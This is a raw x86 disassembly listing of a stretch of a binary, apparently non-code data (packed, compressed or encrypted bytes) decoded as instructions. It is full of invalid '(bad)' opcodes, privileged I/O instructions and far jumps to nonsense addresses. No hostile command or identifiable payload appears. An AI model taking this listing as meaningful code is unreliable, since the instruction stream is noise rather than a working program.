  415ef6:	aad    0x87
  415ef8:	test   DWORD PTR [ebp+0x39],ebp
  415efb:	scas   al,BYTE PTR es:[edi]
  415efc:	pop    esi
  415efd:	in     eax,0x41
  415eff:	mov    al,0x9d
  415f01:	dec    edx
  415f02:	jl     0x415f28
  415f04:	das    
  415f05:	popa   
  415f06:	pop    ebx
  415f07:	scas   al,BYTE PTR es:[edi]
  415f08:	xor    al,0x29
  415f0a:	and    dh,cl
  415f0c:	retf   
  415f0d:	pop    es
  415f0e:	out    dx,eax
  415f0f:	inc    esi
  415f10:	pop    ds
  415f11:	xchg   ebx,eax
  415f12:	sub    dh,dh
  415f14:	mov    edx,ebx
  415f16:	sbb    bh,bh
  415f18:	xchg   edi,eax
  415f19:	push   ds
  415f1a:	mov    eax,ds:0x7a8ed33a
  415f1f:	ret    0xf63c
  415f22:	aas    
  415f23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f24:	cwde   
  415f25:	pop    ss
  415f26:	or     al,0xfd
  415f28:	mov    eax,ds:0x7916c223
  415f2d:	lock ret 
  415f2f:	les    ebp,FWORD PTR [esi]
  415f31:	gs push 0xcfd07b28
  415f37:	cmp    al,0x88
  415f39:	fbstp  TBYTE PTR [edi+0x18]
  415f3c:	jo     0x415f49
  415f3e:	jg     0x415ec3
  415f40:	retf   
  415f41:	ret    
  415f42:	adc    DWORD PTR [ebp+0x1008a454],ebx
  415f48:	fadd   st(5),st
  415f4a:	hlt    
  415f4b:	pop    es
  415f4c:	ins    BYTE PTR es:[edi],dx
  415f4d:	test   DWORD PTR ds:0xb30f6bec,ebx
  415f53:	fcomip st,st(0)
  415f55:	inc    ebx
  415f56:	adc    DWORD PTR [ecx-0x45d8938],eax
  415f5c:	dec    ecx
  415f5d:	(bad)  
  415f5e:	aas    
  415f5f:	pop    esp
  415f60:	fsub   QWORD PTR [esi]
  415f62:	es inc esp
  415f64:	outs   dx,DWORD PTR ds:[esi]
  415f65:	inc    eax
  415f66:	retf   0xd6b7
  415f69:	fmul   DWORD PTR ds:0x9c347560
  415f6f:	dec    esi
  415f70:	mov    ebp,DWORD PTR [edi-0x20995c79]
  415f76:	rcl    BYTE PTR [esi-0x53],0x96
  415f7a:	xor    ah,dl
  415f7c:	pop    esp
  415f7d:	and    BYTE PTR [ebp+0x10d70a67],bh
  415f83:	mov    dh,0x84
  415f85:	pop    ds
  415f86:	push   0xffffffcc
  415f88:	and    BYTE PTR [esi],0x3d
  415f8b:	sub    eax,0xc5440276
  415f90:	(bad)  
  415f91:	(bad)  
  415f92:	pop    ecx
  415f93:	fcomip st,st(3)
  415f95:	in     al,0x59
  415f97:	xor    al,0x35
  415f99:	cmp    DWORD PTR [edx-0x5a],edx
  415f9c:	psubusw mm1,QWORD PTR [edx+ecx*8+0x13]
  415fa1:	mov    ds:0x9cdbe135,eax
  415fa6:	mov    ss,WORD PTR [esi]
  415fa8:	jne    0x415f47
  415faa:	xchg   edx,eax
  415fab:	aas    
  415fac:	lods   al,BYTE PTR ds:[esi]
  415fad:	mov    cl,0xc2
  415faf:	leave  
  415fb0:	ss lock retf 0x8d19
  415fb5:	neg    bl
  415fb7:	xlat   BYTE PTR ds:[ebx]
  415fb8:	dec    esp
  415fb9:	fst    st(5)
  415fbb:	and    BYTE PTR [ebp-0x5c],bh
  415fbe:	(bad)  ds:0x8606289b
  415fc4:	daa    
  415fc5:	or     DWORD PTR [edx+0x543791ab],ebp
  415fcb:	adc    DWORD PTR [ecx+esi*1],esp
  415fce:	jmp    0x41600c
  415fd0:	jmp    0xf4a7:0x81176bb7
  415fd7:	lahf   
  415fd8:	or     BYTE PTR [edi+0x5e],cl
  415fdb:	cs dec ecx
  415fdd:	stc    
  415fde:	outs   dx,BYTE PTR ds:[esi]
  415fdf:	mov    edi,0x546c5b00
  415fe4:	lds    ecx,FWORD PTR [ebp-0x12]
  415fe7:	fist   DWORD PTR [edx+0x1dd5a35c]
  415fed:	mov    al,0x3b
  415fef:	cmp    edx,DWORD PTR [edi+ecx*1+0x215fcddc]
  415ff6:	jae    0x416022
  415ff8:	dec    ebx
  415ff9:	cmp    DWORD PTR [edi+0x40b71fa0],0x54
  416000:	inc    eax
  416001:	or     bh,BYTE PTR [ecx]
  416003:	int    0xf1
  416005:	aad    0xf0
  416007:	aas    
  416008:	mov    eax,0x49e7d671
  41600d:	mov    dh,0xd0
  41600f:	xchg   esi,eax
  416010:	in     eax,0x66
  416012:	std    
  416013:	cmp    al,0xd
  416015:	popf   
  416016:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416017:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416018:	add    DWORD PTR [eax-0x12],eax
  41601b:	(bad)  [ecx+eax*4-0x4]
  41601f:	mov    edx,0x73d53f46
  416024:	pop    ebp
  416025:	cmp    dl,dh
  416027:	shr    DWORD PTR [esi],0x30
  41602a:	sub    eax,0xdd12238a
  41602f:	neg    DWORD PTR [ebp-0x21]
  416032:	dec    esp
  416033:	push   0x60
  416035:	fadd   QWORD PTR [ecx+0x72]
  416038:	je     0x416061
  41603a:	nop
  41603b:	adc    ebx,edi
  41603d:	pop    edx
  41603e:	xor    ch,BYTE PTR [eax+0x78f2bf50]
  416044:	mov    al,ds:0x68152d65
  416049:	pop    esp
  41604a:	and    DWORD PTR [ebp-0x26],0x8f9294d0
  416051:	and    al,0x82
  416053:	sub    al,BYTE PTR [ebx+0x60]
  416056:	aad    0xdd
  416058:	pop    edx
  416059:	out    0x4f,eax
  41605b:	or     ecx,ebx
  41605d:	sub    DWORD PTR [esi-0x6d],edx
  416060:	mov    bh,0xa7
  416062:	inc    eax
  416063:	inc    ebx
  416064:	cld    
  416065:	xchg   edi,eax
  416066:	adc    BYTE PTR [ebx+0x1e855294],ah
  41606c:	pop    es
  41606d:	mov    eax,0xe2d6c6a3
  416072:	mov    ebx,0x43e59caa
  416077:	mov    ecx,0xb53a937d
  41607c:	inc    edi
  41607d:	shr    BYTE PTR [edi+0x45],1
  416080:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416081:	jl     0x416064
  416083:	cmp    BYTE PTR [ecx+esi*2-0x615ccacc],0x3e
  41608b:	or     eax,0x1142c99b
  416090:	enter  0xd82c,0xfe
  416094:	pop    esi
  416095:	or     al,0x57
  416097:	inc    edi
  416098:	scas   al,BYTE PTR es:[edi]
  416099:	test   eax,0xb9380b48
  41609e:	mov    DWORD PTR [edx],ebp
  4160a0:	shl    BYTE PTR [edx],cl
  4160a2:	dec    edx
  4160a3:	int    0x8e
  4160a5:	jmp    0x93654896
  4160aa:	xchg   BYTE PTR [ecx+0x1535cab6],bl
  4160b0:	fnstsw WORD PTR [edi]
  4160b2:	dec    ebx
  4160b3:	(bad)  
  4160b4:	cmp    esi,DWORD PTR [edx+ecx*2+0x107bf94a]
  4160bb:	scas   eax,DWORD PTR es:[edi]
  4160bc:	sbb    edx,ecx
  4160be:	test   bl,dl
  4160c0:	sbb    DWORD PTR [ebx],ebp
  4160c2:	adc    si,WORD PTR [edx+ecx*4-0x29]
  4160c7:	push   ds
  4160c8:	push   cs
  4160c9:	pop    edi
  4160ca:	mov    esp,0xef00a9bc
  4160cf:	and    eax,0x82cdcc7e
  4160d4:	ins    DWORD PTR es:[edi],dx
  4160d5:	cdq    
  4160d6:	sub    eax,0xe26ac84a
  4160db:	jmp    0x416067
  4160dd:	(bad)  
  4160de:	xlat   BYTE PTR ds:[ebx]
  4160df:	push   edi
  4160e0:	in     al,dx
  4160e1:	mov    edx,0x2d378216
  4160e6:	mov    WORD PTR [ecx],ds
  4160e8:	pop    ecx
  4160e9:	call   0x6bcc25af
  4160ee:	mov    bl,0x56
  4160f0:	mov    fs,WORD PTR [ecx-0x3bc8dd3c]
  4160f6:	js     0x416177
  4160f8:	mov    al,0xfc
  4160fa:	push   cs
  4160fb:	pushf  
  4160fc:	cmp    DWORD PTR [ecx-0x3fdd0026],ebx
  416102:	xchg   BYTE PTR [ebx+eiz*4-0x1e],dh
  416106:	nop
  416107:	push   esi
  416108:	scas   eax,DWORD PTR es:[edi]
  416109:	jecxz  0x41609f
  41610b:	sbb    BYTE PTR [edx],dl
  41610d:	scas   eax,DWORD PTR es:[edi]
  41610e:	pop    ebp
  41610f:	mov    ah,0x13
  416111:	(bad)  
  416112:	int    0x8c
  416114:	pop    edx
  416115:	lock iret 
  416117:	or     DWORD PTR [ecx+eax*8],eax
  41611a:	ret    0xcec4
  41611d:	ret    
  41611e:	lods   al,BYTE PTR ds:[esi]
  41611f:	fidivr WORD PTR [edx-0x19]
  416122:	fbld   TBYTE PTR [ebp+0x2b4b69a0]
  416128:	jmp    0x41616d
  41612a:	shl    BYTE PTR [edi+ebp*8+0x62],0x20
  41612f:	inc    ebx
  416130:	sti    
  416131:	daa    
  416132:	inc    esi
  416133:	mov    esi,0xa753825e
  416138:	add    al,bl
  41613a:	pop    esp
  41613b:	pop    ebx
  41613c:	or     ah,BYTE PTR [ecx+0xc25cbf5]
  416142:	push   esp
  416143:	cmp    dh,dl
  416145:	ror    BYTE PTR [ecx-0x13],cl
  416148:	test   al,0x7e
  41614a:	and    al,0x6f
  41614c:	xchg   ecx,eax
  41614d:	or     dh,BYTE PTR [edx-0x2b5c4dd3]
  416153:	add    esp,DWORD PTR [eax-0x5a]
  416156:	(bad)  
  416158:	fcomp  QWORD PTR [esi+0x522e6db]
  41615e:	mov    BYTE PTR [eax],al
  416160:	dec    BYTE PTR [ebx+0x4590368c]
  416166:	stc    
  416167:	test   eax,0x480210f7
  41616c:	jmp    0x19e1cb68
  416171:	js     0x41616a
  416173:	and    BYTE PTR [esp+eax*4],ah
  416176:	xchg   ecx,eax
  416177:	daa    
  416178:	pop    es
  416179:	mov    edi,0x242c410b
  41617e:	adc    al,0x43
  416180:	xor    cl,0xbb
  416183:	dec    edi
  416184:	mov    cl,0x7b
  416186:	pop    esi
  416187:	rcr    DWORD PTR [ebx+0xf],0xac
  41618b:	pop    es
  41618c:	pop    ds
  41618d:	(bad)  
  41618e:	pop    esi
  41618f:	mov    edi,DWORD PTR [esi-0x27a43716]
  416195:	es push es
  416197:	dec    ebp
  416198:	jbe    0x416202
  41619a:	cmp    DWORD PTR [esp+eax*4],ebp
  41619d:	ins    DWORD PTR es:[edi],dx
  41619e:	mov    edi,0x315cd028
  4161a3:	enter  0xe3a8,0x9c
  4161a7:	dec    esp
  4161a8:	in     eax,dx
  4161a9:	fnstenv [ebx+0x73]
  4161ac:	dec    esi
  4161ad:	enter  0x5e5d,0x1e
  4161b1:	adc    BYTE PTR [edx-0x20],al
  4161b4:	aam    0xfa
  4161b6:	inc    ecx
  4161b7:	dec    ebp
  4161b8:	sbb    edx,eax
  4161ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161bb:	jg     0x416156
  4161bd:	es sbb al,0x31
  4161c0:	data16 jb 0x416170
  4161c3:	loopne 0x4161b6
  4161c5:	sub    eax,0x35f27bc6
  4161ca:	sub    edx,DWORD PTR [esi-0x73e8df8c]
  4161d0:	inc    ebp
  4161d1:	push   edx
  4161d2:	push   edi
  4161d3:	pop    ds
  4161d4:	push   cs
  4161d5:	pop    edx
  4161d6:	out    0x38,eax
  4161d8:	(bad)  
  4161d9:	mov    esp,0x367bc84e
  4161de:	push   es
  4161df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161e0:	dec    eax
  4161e1:	jnp    0x4161e4
  4161e3:	mov    ch,0x15
  4161e5:	mov    eax,ds:0x809c7a22
  4161ea:	push   ebx
  4161eb:	imul   edi,DWORD PTR [esi],0xf22390fe
  4161f1:	test   ebx,edi
  4161f3:	pop    ebp
  4161f4:	es in  eax,0xb3
  4161f7:	push   ebp
  4161f8:	ds sbb ebp,edi
  4161fb:	mov    edi,0x5b360849
  416200:	loop   0x4161c4
  416202:	shl    BYTE PTR [esi-0x70],1
  416205:	aaa    
  416206:	sbb    DWORD PTR ds:0x32a4f4ab,ecx
  41620c:	push   ss
  41620d:	inc    esi
  41620e:	xchg   BYTE PTR [ecx],dh
  416210:	dec    ecx
  416211:	push   eax
  416212:	and    BYTE PTR [edi-0x23],dh
  416215:	ins    BYTE PTR es:[edi],dx
  416216:	fwait
  416217:	xor    esi,DWORD PTR [edi+0xf]
  41621a:	je     0x4161f3
  41621c:	jl     0x41627a
  41621e:	rcr    DWORD PTR [edx-0x3c613a50],1
  416224:	(bad)  
  416225:	scas   eax,DWORD PTR es:[edi]
  416226:	sbb    BYTE PTR [ebx-0x2553920a],cl
  41622c:	mov    esi,0xc7090791
  416231:	es pop eax
  416233:	xor    cl,0x53
  416236:	xchg   ebx,esi
  416238:	sub    eax,0x48ad3325
  41623d:	cmp    ecx,ecx
  41623f:	dec    esp
  416240:	(bad)  
  416241:	fcomip st,st(1)
  416243:	fisttp QWORD PTR [edi+0x4c085842]
  416249:	stos   DWORD PTR es:[edi],eax
  41624a:	in     eax,0xfd
  41624c:	outs   dx,DWORD PTR ds:[esi]
  41624d:	pop    eax
  41624e:	scas   al,BYTE PTR es:[edi]
  41624f:	imul   esp,DWORD PTR [edi],0xc634ef59
  416255:	mov    ebx,0x3eb68f0d
  41625a:	loope  0x416265
  41625c:	jmp    0x3329b380
  416261:	pop    esp
  416262:	call   0xa52271c7
  416267:	cmp    BYTE PTR [edi],bl
  416269:	jle    0x4161fb
  41626b:	push   edx
  41626c:	das    
  41626d:	jns    0x4162d0
  41626f:	cmp    DWORD PTR [ecx-0x53],edi
  416272:	dec    edi
  416273:	xlat   BYTE PTR ds:[ebx]
  416275:	or     eax,0xe9d87a70
  41627a:	sbb    BYTE PTR [ebp+0x5036f910],bl
  416280:	repnz or DWORD PTR [eax+0x3f],0xffffff99
  416285:	imul   edi,DWORD PTR [ecx+0xc3f1767],0x6a
  41628c:	jp     0x41629c
  41628e:	clc    
  41628f:	fiadd  WORD PTR [esi]
  416291:	mov    ds:0x497b8dff,al
  416296:	mov    esp,0x854ad5b2
  41629b:	pop    es
  41629c:	int    0x38
  41629e:	jge    0x416255
  4162a0:	dec    eax
  4162a1:	mov    ecx,0x2b172a20
  4162a6:	aam    0x1
  4162a8:	mov    ecx,0x4630c538
  4162ad:	add    edi,ecx
  4162af:	(bad)  
  4162b0:	and    al,bh
  4162b2:	inc    ebx
  4162b3:	repz xchg ebx,eax
  4162b5:	mov    BYTE PTR [eax+0x30],bh
  4162b8:	icebp  
  4162b9:	mov    edi,0x4a88b47b
  4162be:	inc    esp
  4162bf:	test   BYTE PTR [ecx+0x323f1d42],0x4f
  4162c6:	das    
  4162c7:	ret    0x8a14
  4162ca:	push   edx
  4162cb:	jae    0x416320
  4162cd:	pop    esp
  4162ce:	lock xor eax,0xfc4233d9
  4162d4:	ja     0x4162d8
  4162d6:	jae    0x4162ff
  4162d8:	and    ebp,DWORD PTR [edi]
  4162da:	hlt    
  4162db:	push   ss
  4162dc:	xor    esi,DWORD PTR [ebp-0x53]
  4162df:	sub    esi,ecx
  4162e1:	mov    BYTE PTR [ecx],cl
  4162e3:	push   cs
  4162e4:	addr16 ret 0x1dcf
  4162e8:	or     DWORD PTR [edx+0x5],0xffffffbf
  4162ec:	test   eax,0xf46a3c6b
  4162f1:	and    BYTE PTR [ebx],0xc9
  4162f4:	mov    al,0x74
  4162f6:	aas    
  4162f7:	ins    DWORD PTR es:[edi],dx
  4162f8:	out    0x27,al
  4162fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162fb:	mov    al,ds:0x57f478d
  416300:	scas   eax,DWORD PTR es:[edi]
  416301:	xchg   ebx,eax
  416302:	jno    0x41633e
  416304:	xlat   BYTE PTR ds:[ebx]
  416305:	call   0xc48f7af7
  41630a:	stc    
  41630b:	rol    DWORD PTR [ebp+ebx*8+0x28],0x81
  416310:	cmc    
  416311:	out    0x76,al
  416313:	fwait
  416314:	scas   al,BYTE PTR es:[edi]
  416315:	inc    edx
  416316:	lock (bad) 
  416318:	dec    ebp
  416319:	sub    al,0x41
  41631b:	ret    0xbc4a
  41631e:	cli    
  41631f:	mov    ds:0x487e83ae,al
  416324:	cmp    ah,BYTE PTR [ebx]
  416326:	(bad)  
  416327:	js     0x416321
  416329:	outs   dx,BYTE PTR ds:[esi]
  41632a:	test   BYTE PTR [ecx+0x6e22590a],ah
  416330:	or     DWORD PTR [esp+edx*4],ecx
  416333:	test   ebx,0xdf25e407
  416339:	xor    ah,BYTE PTR [edx]
  41633b:	or     ch,BYTE PTR [esi+ebp*2]
  41633e:	mov    ebx,0x36a91490
  416343:	adc    al,BYTE PTR [esi+0x43763ba1]
  416349:	leave  
  41634a:	loop   0x416359
  41634c:	xor    ebx,eax
  41634e:	icebp  
  41634f:	retf   0xaff3
  416352:	dec    eax
  416353:	call   0x59aa:0xb71ba6ed
  41635a:	adc    BYTE PTR [esi+0x16],dh
  41635d:	dec    ebp
  41635e:	mov    edi,0x12da4ac2
  416363:	jp     0x41635d
  416365:	xchg   esi,eax
  416366:	dec    edi
  416367:	loope  0x4163d1
  416369:	mov    ah,ah
  41636b:	popa   
  41636c:	in     al,dx
  41636d:	jno    0x4163e8
  41636f:	dec    eax
  416370:	into   
  416371:	and    BYTE PTR [eax-0x7b],dh
  416374:	inc    esp
  416375:	scas   eax,DWORD PTR es:[edi]
  416376:	sub    eax,0x86b64f5
  41637b:	push   eax
  41637c:	inc    edi
  41637d:	xchg   ecx,eax
  41637e:	(bad)  
  41637f:	cdq    
  416380:	xchg   ebp,eax
  416381:	fst    QWORD PTR [esi+ecx*8]
  416384:	add    edx,edi
  416386:	stos   BYTE PTR es:[edi],al
  416387:	leave  
  416388:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416389:	fs jo  0x41631d
  41638c:	ins    DWORD PTR es:[edi],dx
  41638d:	out    0x93,eax
  41638f:	sti    
  416390:	cmp    al,0xd3
  416392:	xchg   esi,eax
  416393:	gs push cs
  416395:	sub    eax,ebp
  416397:	or     DWORD PTR [eax],ebp
  416399:	mov    BYTE PTR [esi],0xa
  41639c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41639d:	in     eax,0x80
  41639f:	daa    
  4163a0:	in     al,0xb6
  4163a2:	dec    ebp
  4163a3:	in     al,dx
  4163a4:	sub    eax,0xf1465b78
  4163a9:	jl     0x41637c
  4163ab:	inc    edx
  4163ac:	jmp    0xb43b1ed
  4163b1:	and    cl,BYTE PTR [edi-0x669c3e68]
  4163b7:	push   ebx
  4163b8:	jmp    0x4163cb
  4163ba:	loop   0x416348
  4163bc:	cld    
  4163bd:	push   0xffffffa4
  4163bf:	mov    eax,ds:0xc393ff05
  4163c4:	(bad)  
  4163c5:	nop
  4163c6:	mov    esp,0x149a908d
  4163cb:	jecxz  0x41634e
  4163cd:	test   DWORD PTR [ecx],edi
  4163cf:	jmp    0x4685:0x20d27e88
  4163d6:	lock cli 
  4163d8:	mov    ch,0x2
  4163da:	int    0xb3
  4163dc:	out    0x19,eax
  4163de:	imul   ecx,DWORD PTR [edi+0x5162204d],0x72
  4163e5:	out    dx,eax
  4163e6:	inc    ebx
  4163e7:	in     al,dx
  4163e8:	sub    DWORD PTR [ecx-0x6c],edi
  4163eb:	dec    DWORD PTR [ebx]
  4163ed:	repz ficom WORD PTR [ebx+0x5e]
  4163f1:	pop    ds
  4163f2:	pop    ebx
  4163f3:	popf   
  4163f4:	mov    ch,BYTE PTR [ebp-0x65]
  4163f7:	mov    gs,edi
  4163f9:	pushf  
  4163fa:	data16 fdiv DWORD PTR [edi+0x1d]
  4163fe:	push   ebx
  4163ff:	cld    
  416400:	mov    DWORD PTR [ebp+0x1cc139ad],esi
  416406:	aad    0x9b
  416408:	xor    cl,bh
  41640a:	sub    al,0x61
  41640c:	or     esi,DWORD PTR [eax]
  41640e:	pop    ecx
  41640f:	jae    0x41639b
  416411:	ins    DWORD PTR es:[edi],dx
  416412:	sbb    BYTE PTR [esi-0x6f],0x8a
  416416:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416417:	ss inc esi
  416419:	mov    eax,0x7aac222f
  41641e:	inc    eax
  41641f:	stos   BYTE PTR es:[edi],al
  416420:	inc    eax
  416421:	dec    esi
  416422:	mov    al,0x39
  416424:	or     ah,BYTE PTR [edx+0x1a]
  416427:	and    BYTE PTR [edi+0x33699ad],dl
  41642d:	push   eax
  41642e:	repnz call 0x8065:0x4ffe368
  416436:	shl    DWORD PTR [esi+0x6886ed74],cl
  41643c:	cmp    BYTE PTR [ebp+0x10776e60],0xe9
  416443:	aad    0xf8
  416445:	mov    esp,DWORD PTR [ecx-0xd]
  416448:	fs out dx,al
  41644a:	xor    BYTE PTR [esi],dh
  41644c:	mov    edx,0x7d3e2171
  416451:	xchg   BYTE PTR [edi],ch
  416453:	mov    eax,ds:0xc7b375ad
  416459:	iret   
  41645a:	(bad)  
  41645b:	je     0x41647d
  41645d:	mov    cl,0xe1
  41645f:	pop    ss
  416460:	sbb    esi,DWORD PTR [ebx-0x9]
  416463:	lock loop 0x416496
  416466:	lods   eax,DWORD PTR ds:[esi]
  416467:	test   BYTE PTR [esp+eax*2-0x31],ch
  41646b:	jne    0x41640c
  41646d:	mov    esp,0x60f3414
  416472:	scas   eax,DWORD PTR es:[edi]
  416473:	daa    
  416474:	pop    edi
  416475:	jge    0x416497
  416477:	dec    eax
  416478:	xchg   edx,eax
  416479:	pop    esp
  41647a:	cmp    BYTE PTR [esi+edi*2-0x7087e92],cl
  416481:	(bad)  
  416482:	sti    
  416483:	in     eax,dx
  416484:	lods   eax,DWORD PTR ds:[esi]
  416485:	retf   
  416486:	sub    al,BYTE PTR [ecx-0x24fdb718]
  41648c:	or     al,BYTE PTR [ebx]
  41648e:	sti    
  41648f:	adc    DWORD PTR [eax],0xffffff9e
  416492:	or     eax,0x7cd71729
  416497:	(bad)  
  416498:	idiv   BYTE PTR ds:0xb15be98b
  41649e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41649f:	je     0x416462
  4164a1:	int    0xec
  4164a3:	mov    eax,0xfc06d7ac
  4164a8:	cmp    ebp,DWORD PTR [ebx]
  4164aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164ab:	dec    ecx
  4164ac:	cld    
  4164ad:	clc    
  4164ae:	jne    0x4164c4
  4164b0:	and    eax,0xc94996a7
  4164b5:	mov    WORD PTR [ebx],ds
  4164b7:	push   ecx
  4164b8:	sub    ebx,DWORD PTR [eax-0x2]
  4164bb:	inc    ebx
  4164bc:	and    al,BYTE PTR ds:[ebx+0x33c2fd1]
  4164c3:	cmp    eax,DWORD PTR [esi-0x7f4ac670]
  4164c9:	loope  0x41652f
  4164cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164cc:	adc    BYTE PTR [ebp+0xf],dl
  4164cf:	outs   dx,BYTE PTR ds:[esi]
  4164d0:	fadd   QWORD PTR [edx+0x73]
  4164d3:	jbe    0x416478
  4164d5:	call   0xa3102398
  4164da:	cli    
  4164db:	pop    es
  4164dc:	jnp    0x416503
  4164de:	and    bl,bl
  4164e0:	imul   eax,DWORD PTR [ebx+edi*8-0x4308b7d],0x11
  4164e8:	jo     0x41652d
  4164ea:	shl    BYTE PTR [eax],0x52
  4164ed:	pop    ebp
  4164ee:	call   0x9d31:0xad7a0bee
  4164f5:	in     al,0xa
  4164f7:	xor    DWORD PTR [ebx-0x25a5729d],ebx
  4164fd:	adc    dh,0x48
  416500:	cmp    eax,DWORD PTR [esi-0x2e7d5e9]
  416506:	cmp    DWORD PTR [ecx+0x1f5a6880],esp
  41650c:	adc    BYTE PTR [ecx-0x20],ch
  41650f:	ins    DWORD PTR es:[edi],dx
  416510:	push   0xffffffe4
  416512:	daa    
  416513:	bound  edx,QWORD PTR [edx]
  416515:	mov    ds:0x27f7a2b0,eax
  41651a:	sub    ch,BYTE PTR [edx]
  41651c:	add    eax,0x7116e38a
  416521:	inc    edi
  416522:	mov    bh,0x87
  416524:	int3   
  416525:	or     BYTE PTR [eax-0x1d],dl
  416528:	repz adc esp,eax
  41652b:	ja     0x416553
  41652d:	cmp    DWORD PTR [edi-0x54],0x18fa37eb
  416534:	lea    edi,[esi+0x11d54a4f]
  41653a:	inc    esp
  41653b:	dec    ebx
  41653c:	adc    edx,DWORD PTR [eax-0x67]
  41653f:	aad    0xc6
  416541:	enter  0x88a0,0xe4
  416545:	pop    eax
  416546:	sti    
  416547:	adc    eax,0x5b032dd
  41654c:	cmc    
  41654d:	(bad)  
  41654e:	mov    bh,0x59
  416550:	fwait
  416551:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416552:	stos   DWORD PTR es:[edi],eax
  416553:	aam    0x3
  416555:	dec    esi
  416556:	mov    ebx,0xbcc712f6
  41655b:	or     eax,0x2a687609
  416560:	addr16 or edi,ebx
  416563:	push   edx
  416564:	push   0xffffff93
  416566:	mov    dl,0x3b
  416568:	call   0x27f1:0x829acaf0
  41656f:	int3   
  416570:	jns    0x416501
  416572:	jmp    0x416599
  416574:	mov    ecx,0x8463b809
  416579:	ret    0xeb2
  41657c:	dec    esp
  41657d:	sbb    esi,DWORD PTR [esi+0x47]
  416580:	ins    DWORD PTR es:[edi],dx
  416581:	sar    BYTE PTR ds:0x6d62c271,1
  416587:	jb     0x4165d1
  416589:	cmc    
  41658a:	repz mov fs,WORD PTR [eax+0x74]
  41658e:	or     al,0xd6
  416590:	and    DWORD PTR [esi],0xffffffa4
  416593:	lods   al,BYTE PTR ds:[esi]
  416594:	ds dec esp
  416596:	fs push esp
  416598:	int3   
  416599:	jbe    0x416614
  41659b:	(bad)  
  41659c:	cmp    BYTE PTR [edi-0x51],cl
  41659f:	outs   dx,BYTE PTR ds:[esi]
  4165a0:	push   esp
  4165a1:	or     al,0xaf
  4165a3:	int3   
  4165a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165a5:	fs cmc 
  4165a7:	xchg   esi,eax
  4165a8:	and    bh,BYTE PTR [ecx+0x2f4c275]
  4165ae:	mov    al,0x14
  4165b0:	jle    0x416599
  4165b2:	bound  ebx,QWORD PTR ss:[esi-0x63]
  4165b6:	sub    DWORD PTR [eax],ebx
  4165b8:	mov    ah,0x19
  4165ba:	scas   eax,DWORD PTR es:[edi]
  4165bb:	inc    esi
  4165bc:	test   eax,0x998f00d9
  4165c1:	addr16 enter 0x6668,0x9f
  4165c6:	xor    esi,DWORD PTR [ecx]
  4165c8:	jmp    0x9bf27080
  4165cd:	xor    al,0x1
  4165cf:	(bad)  
  4165d0:	fild   QWORD PTR [ebp-0x7d]
  4165d3:	or     al,0x4
  4165d5:	sahf   
  4165d6:	adc    DWORD PTR [edx-0x17],eax
  4165d9:	test   bh,dl
  4165db:	push   esi
  4165dc:	adc    dl,BYTE PTR [edx]
  4165de:	mov    ecx,0xad892304
  4165e3:	jae    0x4165e5
  4165e5:	sbb    eax,0xa94cf4a2
  4165ea:	mov    ?,WORD PTR [eax-0x42704fdf]
  4165f0:	sahf   
  4165f1:	jmp    0xa690:0x50ef6eb8
  4165f8:	icebp  
  4165f9:	add    BYTE PTR [esp+esi*4-0x10],0x7c
  4165fe:	jmp    0x416594
  416600:	inc    edi
  416601:	fmul   DWORD PTR [esp+edx*8+0x49]
  416605:	lods   eax,DWORD PTR ds:[esi]
  416606:	aas    
  416607:	adc    eax,0xb9600391
  41660c:	push   0x64
  41660e:	hlt    
  41660f:	pop    ss
  416610:	out    0xf1,eax
  416612:	mov    fs,WORD PTR ds:0xf75a48a4
  416618:	xor    ah,BYTE PTR [edi-0x4ee30b37]
  41661e:	fdiv   DWORD PTR [ebp+0x738344ec]
  416624:	in     al,dx
  416625:	mov    ebx,0x7745d786
  41662a:	mov    dh,BYTE PTR [eax+ecx*2+0x6106615f]
  416631:	in     al,0xb5
  416633:	imul   BYTE PTR [eax-0xe]
  416636:	or     eax,0x72ff7b8e
  41663b:	lahf   
  41663c:	cwde   
  41663d:	lods   al,BYTE PTR ds:[esi]
  41663e:	fs mov edi,0xc1242ef7
  416644:	mov    ds:0x6228ae2e,eax
  416649:	inc    edi
  41664a:	push   ebp
  41664b:	scas   eax,DWORD PTR es:[edi]
  41664c:	xchg   ebx,eax
  41664d:	int3   
  41664e:	xor    eax,edx
  416650:	sbb    DWORD PTR gs:[ebp-0x69],edi
  416654:	push   eax
  416655:	call   0x2015de58
  41665a:	cli    
  41665b:	xchg   esp,eax
  41665c:	sub    dh,0x4b
  41665f:	loop   0x41666b
  416661:	jge    0x4166ca
  416663:	add    ah,BYTE PTR [edx-0x67]
  416666:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416667:	jge    0x4166e2
  416669:	loopne 0x41667b
  41666b:	sub    dh,BYTE PTR [ebx]
  41666d:	xlat   BYTE PTR ds:[ebx]
  41666e:	inc    edi
  41666f:	outs   dx,DWORD PTR ds:[esi]
  416670:	and    al,0xfe
  416672:	push   ebx
  416673:	cmp    edx,DWORD PTR [ebp+0x7f]
  416676:	xchg   edx,eax
  416677:	out    dx,al
  416678:	sub    BYTE PTR [ebp-0x71],ah
  41667b:	repz xchg esi,eax
  41667d:	sub    dh,dh
  41667f:	je     0x416635
  416681:	sub    ecx,DWORD PTR ss:[ecx-0x61d9f70e]
  416688:	lds    edx,FWORD PTR [esi-0x290d9447]
  41668e:	lahf   
  41668f:	test   DWORD PTR [ebx],edi
  416691:	push   ss
  416692:	adc    BYTE PTR [edx-0x47],bh
  416695:	xchg   ecx,eax
  416696:	xchg   edi,eax
  416697:	inc    ecx
  416698:	loope  0x4166e6
  41669a:	add    al,0x42
  41669c:	mov    al,BYTE PTR [edi]
  41669e:	rol    BYTE PTR gs:[eax],0x2c
